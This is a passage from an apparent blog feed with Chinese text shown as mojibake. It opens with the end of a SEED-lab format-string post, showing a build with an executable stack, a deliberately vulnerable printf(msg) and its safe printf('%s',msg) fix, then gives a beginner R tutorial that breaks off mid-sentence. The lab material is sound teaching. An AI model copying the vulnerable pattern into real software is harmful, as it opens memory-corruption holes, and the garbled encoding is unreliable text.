class="hljs-number">-32</span> <span class="hljs-keyword">format</span>.c<br><span class="hljs-keyword">format</span>.c: <span class="hljs-keyword">In</span> <span class="hljs-keyword">function</span> â€˜myprintfâ€™:<br><span class="hljs-keyword">format</span>.c:<span class="hljs-number">44</span>:<span class="hljs-number">5</span>: <span class="hljs-built_in">warning</span>: <span class="hljs-keyword">format</span> <span class="hljs-keyword">not</span> a string literal <span class="hljs-keyword">and</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">format</span> arguments [-Wformat-<span class="hljs-keyword">security</span>]<br>   <span class="hljs-number">44</span> |     printf(msg);<br>      |     ^~~~~~<br>gcc -DBUF_SIZE=<span class="hljs-number">100</span> -z execstack  -o <span class="hljs-keyword">format</span><span class="hljs-number">-64</span> <span class="hljs-keyword">format</span>.c<br><span class="hljs-keyword">format</span>.c: <span class="hljs-keyword">In</span> <span class="hljs-keyword">function</span> â€˜myprintfâ€™:<br><span class="hljs-keyword">format</span>.c:<span class="hljs-number">44</span>:<span class="hljs-number">5</span>: <span class="hljs-built_in">warning</span>: <span class="hljs-keyword">format</span> <span class="hljs-keyword">not</span> a string literal <span class="hljs-keyword">and</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">format</span> arguments [-Wformat-<span class="hljs-keyword">security</span>]<br>   <span class="hljs-number">44</span> |     printf(msg);<br>      |     ^~~~~~<br></code></pre></td></tr></table></figure><p>é¿å…å°†å®¢æˆ·ç«¯è¾“å…¥çš„å­—ç¬¦ä¸²ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">// This line has a <span class="hljs-keyword">format</span>-string vulnerability<br>    <span class="hljs-keyword">printf</span>(msg);<br><span class="hljs-regexp">//</span> This line <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> have a <span class="hljs-keyword">format</span>-string vulnerability<br>    <span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,msg);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Rè¯­è¨€å…¥é—¨</title>
    <link href="/p/634ccbb5/"/>
    <url>/p/634ccbb5/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/R-Banner-Image-2.png"></p><h1 id="Rè¯­è¨€ç®€ä»‹"><a href="#Rè¯­è¨€ç®€ä»‹" class="headerlink" title="Rè¯­è¨€ç®€ä»‹"></a>Rè¯­è¨€ç®€ä»‹</h1><p>1992å¹´ç”±<strong>R</strong>oss Ihaka å’Œ <strong>R</strong>obert Gentlemanå‘æ˜ï¼Œå› æ­¤å«åšRè¯­è¨€</p><p>Rçš„ç‰¹ç‚¹ï¼š</p><ul><li>ä¸€ä¸ªä¸“æ³¨äºç»Ÿè®¡åˆ†æã€åˆ¶å›¾çš„è¯­è¨€</li><li>å…è´¹ã€å¼€æº</li><li>é€‚ç”¨äºå¤šä¸ªç³»ç»Ÿï¼ˆWindowsã€macOSã€Linuxï¼‰</li><li>æœ‰ä¸°å¯Œçš„åº“</li><li>ç¤¾åŒºæ´»è·ƒ</li></ul><h1 id="å®‰è£…-amp-ç¯å¢ƒé…ç½®"><a href="#å®‰è£…-amp-ç¯å¢ƒé…ç½®" class="headerlink" title="å®‰è£…&amp;ç¯å¢ƒé…ç½®"></a>å®‰è£…&amp;ç¯å¢ƒé…ç½®</h1><h2 id="å®‰è£…Rè¯­è¨€"><a href="#å®‰è£…Rè¯­è¨€" class="headerlink" title="å®‰è£…Rè¯­è¨€"></a>å®‰è£…Rè¯­è¨€</h2><p>ä»¥Windowsä¸ºä¾‹</p><ul><li>åœ¨<a href="https://cloud.r-project.org/%E4%B8%8B%E8%BD%BDR%E8%AF%AD%E8%A8%80">https://cloud.r-project.org/ä¸‹è½½Rè¯­è¨€</a></li><li>ä½¿ç”¨R studioæˆ–è€…vscodeä½œä¸ºide</li><li>ä½¿ç”¨<code>install.packages(&quot;tidyverse&quot;)</code>è¯­å¥å®‰è£…å®åŒ…ã€‚å…¶ä¸­ï¼Œtydyverseæ˜¯ä¸€ä¸ªå®åŒ…</li><li>é…ç½®ç¯å¢ƒå˜é‡ï¼Œä½¿å¾—å‘½ä»¤è¡Œå¯ä»¥è¯†åˆ«R.exe</li></ul><h2 id="åœ¨vscodeä¸­é…ç½®Rè¯­è¨€ç¯å¢ƒ"><a href="#åœ¨vscodeä¸­é…ç½®Rè¯­è¨€ç¯å¢ƒ" class="headerlink" title="åœ¨vscodeä¸­é…ç½®Rè¯­è¨€ç¯å¢ƒ"></a>åœ¨vscodeä¸­é…ç½®Rè¯­è¨€ç¯å¢ƒ</h2><p>å®‰è£…æ‹“å±•ï¼š</p><ol><li>R æ‰©å±•ï¼šæä¾›äº† R è¯­è¨€çš„è¯­æ³•é«˜äº®ã€ä»£ç è¡¥å…¨ã€è°ƒè¯•åŠŸèƒ½ç­‰ã€‚</li><li>R LSP æ‰©å±•ï¼šæä¾›äº† R è¯­è¨€çš„ Language Server Protocolï¼ˆLSPï¼‰æ”¯æŒï¼Œå¯ä»¥æä¾›æ›´å¼ºå¤§çš„ä»£ç åˆ†æå’Œè‡ªåŠ¨è¡¥å…¨åŠŸèƒ½ã€‚</li></ol><p>é…ç½® R ç¯å¢ƒè·¯å¾„</p><ul><li><p>åœ¨ VSCode ä¸­ï¼ŒæŒ‰ä¸‹å¿«æ·é”® â€œCtrl+Shift+Pâ€ï¼ˆæˆ–è€… â€œF1â€ï¼‰ï¼Œåœ¨å‘½ä»¤é¢æ¿ä¸­è¾“å…¥ â€œsettingsâ€ å¹¶é€‰æ‹© â€œPreferences: Open User Settingsâ€ æ‰“å¼€ç”¨æˆ·è®¾ç½®çª—å£</p></li><li><p>æ‰¾åˆ° â€œR: Executable Pathâ€ é€‰é¡¹ï¼Œç‚¹å‡»ç¼–è¾‘å›¾æ ‡ï¼Œåœ¨å¼¹å‡ºæ¡†ä¸­è¾“å…¥ R ç¯å¢ƒçš„è·¯å¾„ï¼ˆå¦‚ â€œC:\Program Files\R\R-4.0.4\bin\R.exeâ€ï¼‰ï¼Œä¿å­˜è®¾ç½®</p></li><li><p>æŸ¥æ‰¾r.rtermã€‚å¡«å†™radian.exeçš„è·¯å¾„</p></li></ul><p>å®‰è£…<code>languageserver</code>åŒ…å’Œ<code>httpgd</code>åŒ…ï¼š</p><ul><li>æ³¨æ„è¦æ˜¯ç”¨ç®¡ç†å‘˜æ¨¡å¼ä¸‹çš„å‘½ä»¤è¡Œ</li><li>åœ¨è®¾ç½®ä¸­é€‰æ‹©<code>use httpgd</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">install.packages(&quot;languageserver&quot;)<br>install.packages(&quot;httpgd&quot;)<br><br>pip install radian<br></code></pre></td></tr></table></figure><blockquote><p>4-9æ›´æ–°ï¼švscode nmslï¼ŒRStudioæ‰æ˜¯yyds</p></blockquote><h1 id="Rè¯­è¨€è¯­æ³•é€Ÿé€š"><a href="#Rè¯­è¨€è¯­æ³•é€Ÿé€š" class="headerlink" title="Rè¯­è¨€è¯­æ³•é€Ÿé€š"></a>Rè¯­è¨€è¯­æ³•é€Ÿé€š</h1><h2 id="å¯¹è±¡"><a href="#å¯¹è±¡" class="headerlink" title="å¯¹è±¡"></a>å¯¹è±¡</h2><p>Rä¸­å­˜å‚¨çš„æ•°æ®æ˜¯<strong>å¯¹è±¡</strong>ï¼Œä½¿ç”¨<code>&lt;-</code>å¯ä»¥å¯¹å¯¹è±¡èµ‹å€¼ï¼Œå˜é‡å‘½åéœ€è¦éµå¾ªä¸€å®šçš„è§„åˆ™</p><p>å¯¹è±¡ä¸è®¸å¤šå±æ€§ï¼Œæ¯”å¦‚ç±»å‹å’Œé•¿åº¦</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs R">r$&gt; data &lt;- read.csv(<span class="hljs-string">&quot;yourname_sample_data.csv&quot;</span>, header = <span class="hljs-literal">TRUE</span>, sep = <span class="hljs-string">&quot;,&quot;</span>)<br><br>r$&gt; typeof(data)<br>[<span class="hljs-number">1</span>] <span class="hljs-string">&quot;list&quot;</span><br><br>r$&gt; <span class="hljs-built_in">length</span>(data)<br>[<span class="hljs-number">1</span>] <span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><h2 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h2><h3 id="å‘é‡"><a href="#å‘é‡" class="headerlink" title="å‘é‡"></a>å‘é‡</h3><p>å‘é‡æ˜¯Rè¯­è¨€ä¸­çš„ä¸€ç§æ•°æ®ç±»å‹ï¼Œæ˜¯Rè¯­è¨€ä¸­æœ€åŸºç¡€çš„æ•°æ®ç»“æ„</p><p><code>c()</code> å‡½æ•°å¯ä»¥å¯¹å‘é‡è¿›è¡Œèšåˆæ“ä½œ</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment">#æ•°å€¼å‹å‘é‡</span><br>x &lt;- <span class="hljs-built_in">c</span>(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>)<br>x &lt;- <span class="hljs-built_in">c</span>(<span class="hljs-number">3e+06</span>, <span class="hljs-number">1.23e2</span>)     <span class="hljs-comment"># åŒç²¾åº¦ç±»å‹ï¼Œç§‘å­¦è®¡æ•°æ³•</span><br><br><span class="hljs-comment">#å­—ç¬¦ä¸²å‹å‘é‡</span><br>x &lt;- <span class="hljs-built_in">c</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-string">&#x27;Charlie&#x27;</span>, <span class="hljs-string">&#x27;Dave&#x27;</span>)  <br><br><span class="hljs-comment">#å› å­å‹å‘é‡ï¼Œæ˜¯å¸¦æœ‰å±‚çº§ï¼ˆLevelsï¼‰çš„å­—ç¬¦ä¸²å‘é‡ï¼ŒæŒ‡å®šå±‚çº§ä¿¡æ¯</span><br>four_seasons &lt;- <span class="hljs-built_in">c</span>(<span class="hljs-string">&quot;spring&quot;</span>, <span class="hljs-string">&quot;summer&quot;</span>, <span class="hljs-string">&quot;autumn&quot;</span>, <span class="hljs-string">&quot;winter&quot;</span>)<br>four_seasons_factor &lt;- factor(four_seasons, <br>                              levels = <span class="hljs-built_in">c</span>(<span class="hljs-string">&quot;summer&quot;</span>, <span class="hljs-string">&quot;winter&quot;</span>, <span class="hljs-string">&quot;spring&quot;</span>, <span class="hljs-string">&quot;autumn&quot;</span>)<br>                              )<br></code></pre></td></tr></table></figure><h3 id="çŸ©é˜µ"><a href="#çŸ©é˜µ" class="headerlink" title="çŸ©é˜µ"></a>çŸ©é˜µ</h3><p>ç”¨ <code>matrix()</code> å‡½æ•°åˆ›å»ºçŸ©é˜µï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯çŸ©é˜µå‘é‡ï¼Œç¬¬äºŒä¸ªæŒ‡å®šè¡Œï¼Œç¬¬ä¸‰ä¸ªæŒ‡å®šåˆ—</p><p>é»˜è®¤æ˜¯ç«–ç€æ’ï¼Œå¦‚æœæƒ³æ¨ªç€æ’å°±åº”è¯¥æŒ‡å®š<code>byrow = TRUE</code></p><p>ç«–ç€æ’</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs r">m &lt;- matrix(<br>  <span class="hljs-built_in">c</span>(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>),<br>  nrow = <span class="hljs-number">2</span>, <br>  ncol = <span class="hljs-number">3</span><br>)<br><br><span class="hljs-comment">##      [,1] [,2] [,3]</span><br><span class="hljs-comment">## [1,]    2    3    5</span><br><span class="hljs-comment">## [2,]    4    1    7</span><br></code></pre></td></tr></table></figure><p>æ¨ªç€æ’</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs r">matrix(<br>  <span class="hljs-built_in">c</span>(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>),<br>  nrow = <span class="hljs-number">2</span>, <br>  ncol = <span class="hljs-number">3</span>,<br>  byrow = <span class="hljs-literal">TRUE</span><br>)<br><span class="hljs-comment">##      [,1] [,2] [,3]</span><br><span class="hljs-comment">## [1,]    2    4    3</span><br><span class="hljs-comment">## [2,]    1    5    7</span><br></code></pre></td></tr></table></figure><h3 id="åˆ—è¡¨"><a href="#åˆ—è¡¨" class="headerlink" title="åˆ—è¡¨"></a>åˆ—è¡¨</h3><p><strong>åˆ—è¡¨ï¼ˆlistï¼‰</strong>å¯ä»¥å°†ä¸åŒçš„æ•°æ®ç»“æ„ç»„åˆèµ·æ¥</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs r">list1 &lt;- <span class="hljs-built_in">list</span>(<br>  a = <span class="hljs-built_in">c</span>(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>),<br>  b = <span class="hljs-built_in">c</span>(<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;love&quot;</span>, <span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;language&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>),<br>  <span class="hljs-built_in">c</span> = <span class="hljs-built_in">c</span>(<span class="hljs-literal">TRUE</span>, <span class="hljs-literal">TRUE</span>, <span class="hljs-literal">FALSE</span>, <span class="hljs-literal">TRUE</span>)<br>)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç»„åˆäº†abcï¼Œåˆ†åˆ«æ˜¯æ•°å­—å‘é‡ã€å­—ç¬¦ä¸²å‘é‡ã€å¸ƒå°”å‘é‡</p><h3 id="æ•°æ®æ¡†"><a href="#æ•°æ®æ¡†" class="headerlink" title="æ•°æ®æ¡†"></a>æ•°æ®æ¡†</h3><p><strong>æ•°æ®æ¡†ï¼ˆdata frameï¼‰</strong>æ˜¯ä¸€ç§ç‰¹æ®Šçš„åˆ—è¡¨ï¼Œåˆ—è¡¨ä¸­çš„å…ƒç´ å¿…é¡»æ˜¯ç­‰é•¿çš„ï¼Œå¾ˆåƒæ˜¯Excelè¡¨æ ¼</p><h2 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h2><p>ä»¥å‘é‡Wieä¾‹</p><h3 id="åŠ å‡ä¹˜é™¤æ¨¡"><a href="#åŠ å‡ä¹˜é™¤æ¨¡" class="headerlink" title="åŠ å‡ä¹˜é™¤æ¨¡"></a>åŠ å‡ä¹˜é™¤æ¨¡</h3><p>ä¸¤ä¸ªå‘é‡çš„åŠ å‡ä¹˜é™¤æ˜¯å°†ç›¸åŒä½ç½®çš„å…ƒç´ è¿›è¡Œè¿ç®—ï¼Œä»¥Ã·ä¸ºä¾‹</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs r">a &lt;- <span class="hljs-built_in">c</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br>b &lt;- <span class="hljs-built_in">c</span>(<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>)<br>a / b<br><span class="hljs-comment">## [1] 0.25 0.40 0.50</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œ<code>/</code>æ˜¯é™¤ï¼Œ<code>%%</code>æ˜¯å–æ¨¡æ“ä½œ</p><p><code>%*%</code>æ˜¯æ±‚å†…ç§¯ï¼ˆç‚¹ä¹˜ï¼‰</p><h3 id="å¾ªç¯è¡¥é½"><a href="#å¾ªç¯è¡¥é½" class="headerlink" title="å¾ªç¯è¡¥é½"></a>å¾ªç¯è¡¥é½</h3><p>å½“ä¸¤ä¸ªå‘é‡é•¿åº¦ä¸ç›¸ç­‰çš„æ—¶å€™ï¼ŒçŸ­çš„å‘é‡ä¼š<strong>å¾ªç¯è¡¥é½</strong></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs r">x &lt;- <span class="hljs-built_in">c</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br>y &lt;- <span class="hljs-built_in">c</span>(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <span class="hljs-number">50</span>, <span class="hljs-number">60</span>, <span class="hljs-number">70</span>)<br><br>x + y<br><br><span class="hljs-comment">## [1] 11 22 33 41 52 63 71</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢ä¾‹å­ä¸­ï¼Œxä¼šè‡ªåŠ¨è¡¥é½ä¸º(1, 2, 3ï¼Œ1, 2, 3ï¼Œ1)ï¼Œä¹Ÿå³æ˜¯å¾ªç¯å¤åˆ¶ï¼Œç›´è‡³ä¸yçš„é•¿åº¦ç›¸åŒï¼Œä¹‹åè¿›è¡Œè¿ç®—</p><h3 id="å…³ç³»è¿ç®—ç¬¦"><a href="#å…³ç³»è¿ç®—ç¬¦" class="headerlink" title="å…³ç³»è¿ç®—ç¬¦"></a>å…³ç³»è¿ç®—ç¬¦</h3><p>æ¯”å¦‚æ¯”è¾ƒä¸¤ä¸ªå‘é‡çš„ä»£é”€å…³ç³»ï¼Œæ˜¯å¦ç›¸ç­‰</p><h3 id="é€»è¾‘è¿ç®—ç¬¦"><a href="#é€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="é€»è¾‘è¿ç®—ç¬¦"></a>é€»è¾‘è¿ç®—ç¬¦</h3><p>ä¸æˆ–é</p><h3 id="å†’å·è¿ç®—ç¬¦"><a href="#å†’å·è¿ç®—ç¬¦" class="headerlink" title="å†’å·è¿ç®—ç¬¦"></a>å†’å·è¿ç®—ç¬¦</h3><ul><li><p>åˆ›å»ºæ•´æ•°åºåˆ—ï¼Œæ¯”å¦‚1:10åˆ›å»º<code>1~10</code>çš„æ•´æ•°åºåˆ—</p></li><li><p>seqå‡½æ•°ä¹Ÿå¯ä»¥åˆ›å»ºåºåˆ—<code>seq(from = 1, to = 10, by = 1)</code></p></li><li><p><code>%in%</code> è¿ç®—ç¬¦ç”¨äºåˆ¤æ–­å…ƒç´ æ˜¯å¦å±äºå‘é‡</p></li></ul><h2 id="ç‰¹æ®Šå€¼"><a href="#ç‰¹æ®Šå€¼" class="headerlink" title="ç‰¹æ®Šå€¼"></a>ç‰¹æ®Šå€¼</h2><ul><li><code>Inf</code>ï¼Œ<strong>Infinity</strong>ï¼Œæ— é™å¤§</li><li><code>NaN</code>ï¼Œ<strong>Not a Number</strong>ï¼Œæ¯”å¦‚0/0</li></ul><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><h3 id="å†…ç½®å‡½æ•°"><a href="#å†…ç½®å‡½æ•°" class="headerlink" title="å†…ç½®å‡½æ•°"></a>å†…ç½®å‡½æ•°</h3><p>æ•°å­¦å‡½æ•°</p><ul><li><code>sum()</code>: è®¡ç®—å‘é‡æˆ–çŸ©é˜µä¸­æ‰€æœ‰å…ƒç´ çš„æ€»å’Œã€‚</li><li><code>mean()</code>: è®¡ç®—å‘é‡æˆ–çŸ©é˜µä¸­æ‰€æœ‰å…ƒç´ çš„å¹³å‡å€¼ã€‚</li><li><code>max()</code>: æ‰¾å‡ºå‘é‡æˆ–çŸ©é˜µä¸­çš„æœ€å¤§å€¼ã€‚</li><li><code>min()</code>: æ‰¾å‡ºå‘é‡æˆ–çŸ©é˜µä¸­çš„æœ€å°å€¼ã€‚</li><li><code>abs()</code>: æ±‚ä¸€ä¸ªæ•°æˆ–ä¸€ç»„æ•°çš„ç»å¯¹å€¼ã€‚</li><li><code>sqrt()</code>: æ±‚ä¸€ä¸ªæ•°æˆ–ä¸€ç»„æ•°çš„å¹³æ–¹æ ¹ã€‚</li><li><code>exp()</code>: æ±‚ä¸€ä¸ªæ•°æˆ–ä¸€ç»„æ•°çš„æŒ‡æ•°å‡½æ•°ã€‚</li><li><code>log()</code>: æ±‚ä¸€ä¸ªæ•°æˆ–ä¸€ç»„æ•°çš„è‡ªç„¶å¯¹æ•°ã€‚</li></ul><p>æ•°æ®å¤„ç†å‡½æ•°</p><ul><li><code>unique()</code>: å»é™¤å‘é‡æˆ–æ•°æ®æ¡†ä¸­çš„é‡å¤å…ƒç´ ã€‚</li><li><code>sort()</code>: å¯¹å‘é‡è¿›è¡Œæ’åºã€‚</li><li><code>order()</code>: å¯¹å‘é‡æ’åºå¹¶è¿”å›æ’åºåå…ƒç´ åœ¨åŸå§‹å‘é‡ä¸­çš„ä¸‹æ ‡ã€‚</li><li><code>subset()</code>: å¯¹æ•°æ®æ¡†è¿›è¡Œå­é›†æ“ä½œã€‚</li><li><code>merge()</code>: å°†ä¸¤ä¸ªæ•°æ®æ¡†æŒ‰ç…§æŸä¸€åˆ—å…³é”®å­—åˆå¹¶ã€‚</li><li><code>aggregate()</code>: æ ¹æ®å˜é‡å¯¹æ•°æ®æ¡†è¿›è¡Œåˆ†ç»„æ±‡æ€»ã€‚</li><li><code>table()</code>: ç»Ÿè®¡å‘é‡æˆ–æ•°æ®æ¡†ä¸­å„å…ƒç´ çš„å‡ºç°æ¬¡æ•°ã€‚</li></ul><p>å›¾å½¢å‡½æ•°</p><ul><li><code>plot()</code>: ç»˜åˆ¶æ•£ç‚¹å›¾ã€æŠ˜çº¿å›¾ç­‰å¸¸è§ç»Ÿè®¡å›¾å½¢ã€‚</li><li><code>hist()</code>: ç»˜åˆ¶ç›´æ–¹å›¾ã€‚</li><li><code>barplot()</code>: ç»˜åˆ¶æ¡å½¢å›¾ã€‚</li><li><code>boxplot()</code>: ç»˜åˆ¶ç®±çº¿å›¾ã€‚</li><li><code>pie()</code>: ç»˜åˆ¶é¥¼å›¾ã€‚</li></ul><h3 id="è‡ªå®šä¹‰å‡½æ•°"><a href="#è‡ªå®šä¹‰å‡½æ•°" class="headerlink" title="è‡ªå®šä¹‰å‡½æ•°"></a>è‡ªå®šä¹‰å‡½æ•°</h3><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs r">my_divide &lt;- <span class="hljs-keyword">function</span>(a, b) &#123;<br>  <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>) &#123;<br>    stop(<span class="hljs-string">&quot;Error: second parameter can&#x27;t be zero!&quot;</span>)<br>  &#125;<br>  result &lt;- a/b<br>  <span class="hljs-built_in">return</span>(result)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ç®¡é“æ“ä½œ"><a href="#ç®¡é“æ“ä½œ" class="headerlink" title="ç®¡é“æ“ä½œ"></a>ç®¡é“æ“ä½œ</h2><p>ç®¡é“æ“ä½œç¬¦ <code>%&gt;%</code> å°†å·¦ä¾§è¡¨è¾¾å¼çš„ç»“æœä½œä¸ºå³ä¾§è¡¨è¾¾å¼çš„ç¬¬ä¸€ä¸ªå‚æ•°è¿›è¡Œä¼ é€’</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># åŠ è½½tidyverseåŒ…</span><br>library(tidyverse)<br><br><span class="hljs-comment"># è¯»å–æ•°æ®</span><br>data &lt;- read_csv(<span class="hljs-string">&quot;data.csv&quot;</span>)<br><br><span class="hljs-comment"># è¿›è¡Œæ•°æ®æ¸…æ´—å’Œè½¬æ¢</span><br>result &lt;- data %&gt;% <br>  filter(year &gt; <span class="hljs-number">2010</span>) %&gt;%           <span class="hljs-comment"># åªä¿ç•™2010å¹´ä¹‹åçš„æ•°æ®</span><br>  group_by(country) %&gt;%             <span class="hljs-comment"># æŒ‰å›½å®¶åˆ†ç»„</span><br>  summarize(avg_income = mean(income)) %&gt;%    <span class="hljs-comment"># è®¡ç®—æ¯ä¸ªå›½å®¶çš„å¹³å‡æ”¶å…¥</span><br>  arrange(desc(avg_income))         <span class="hljs-comment"># æŒ‰ç…§å¹³å‡æ”¶å…¥é™åºæ’åˆ—</span><br><br><span class="hljs-comment"># æŸ¥çœ‹ç»“æœ</span><br>result<br><br></code></pre></td></tr></table></figure><p>ä»£ç ä»ä¸€ä¸ªCSVæ–‡ä»¶ä¸­è¯»å–æ•°æ®ï¼Œç„¶åä½¿ç”¨ç®¡é“æ“ä½œç¬¦å¯¹æ•°æ®è¿›è¡Œç­›é€‰ã€åˆ†ç»„ã€æ±‡æ€»å’Œæ’åºç­‰æ“ä½œï¼Œæœ€ç»ˆå¾—åˆ°ä¸€ä¸ªæŒ‰ç…§å¹³å‡æ”¶å…¥é™åºæ’åˆ—çš„æ•°æ®æ¡†ã€‚é€šè¿‡ä½¿ç”¨ç®¡é“æ“ä½œç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ›´å°‘çš„ä»£ç å®Œæˆæ›´å¤šçš„å·¥ä½œï¼Œ<strong>åŒæ—¶ä½¿ä»£ç æ›´åŠ æ˜“äºç†è§£</strong></p><h2 id="tidyreverse"><a href="#tidyreverse" class="headerlink" title="tidyreverse"></a>tidyreverse</h2><p>æ•°æ®æ¸…æ´—å’Œè½¬æ¢ï¼š</p><ul><li><code>filter()</code> å‡½æ•°ï¼šæ ¹æ®æ¡ä»¶ç­›é€‰æ•°æ®</li><li><code>select()</code> å‡½æ•°ï¼šé€‰æ‹©ä¿ç•™çš„åˆ—</li><li><code>mutate()</code> å‡½æ•°ï¼šæ–°å¢æˆ–ä¿®æ”¹æ•°æ®åˆ—</li><li><code>group_by()</code> å‡½æ•°ï¼šæŒ‰ç…§æŸä¸ªå˜é‡åˆ†ç»„</li><li><code>summarize()</code> å‡½æ•°ï¼šå¯¹æ¯ä¸ªåˆ†ç»„è¿›è¡Œæ±‡æ€»è®¡ç®—</li><li><code>arrange()</code> å‡½æ•°ï¼šåŸºäºæŸä¸ªå˜é‡æ’åº</li></ul><p>æ•°æ®å¯è§†åŒ–ï¼š</p><ul><li><code>ggplot()</code> å‡½æ•°ï¼šåˆ›å»ºé«˜è´¨é‡çš„æ•°æ®å¯è§†åŒ–å›¾å½¢</li><li><code>geom_*()</code> å‡½æ•°ï¼šå®šä¹‰å¯è§†åŒ–å›¾å½¢çš„å‡ ä½•å¯¹è±¡å¦‚ç‚¹ã€çº¿ã€åŒºåŸŸç­‰</li><li><code>aes()</code> å‡½æ•°ï¼šè®¾ç½®å›¾å½¢çš„æ˜ å°„å…³ç³»ï¼Œå¦‚xè½´ã€yè½´å’Œé¢œè‰²ç­‰</li><li><code>theme()</code> å‡½æ•°ï¼šè°ƒæ•´å›¾å½¢çš„ä¸»é¢˜å’Œå¤–è§‚</li></ul><h3 id="ggplotï¼ˆgrammar-of-graphicsï¼‰"><a href="#ggplotï¼ˆgrammar-of-graphicsï¼‰" class="headerlink" title="ggplotï¼ˆgrammar of graphicsï¼‰"></a>ggplotï¼ˆgrammar of graphicsï¼‰</h3><p>åœ¨ ggplot ä¸­ï¼Œå›¾å½¢æ˜¯ç”±å›¾å±‚ (layer) ç»„æˆçš„ï¼Œæ¯ä¸ªå›¾å±‚åŒ…å«ä»¥ä¸‹ä¸‰ä¸ªéƒ¨åˆ†ï¼š</p><ol><li>æ•°æ®é›†ï¼ˆdataï¼‰ï¼šå³å°†è¦ç»˜åˆ¶çš„æ•°æ®ã€‚</li><li>å‡ 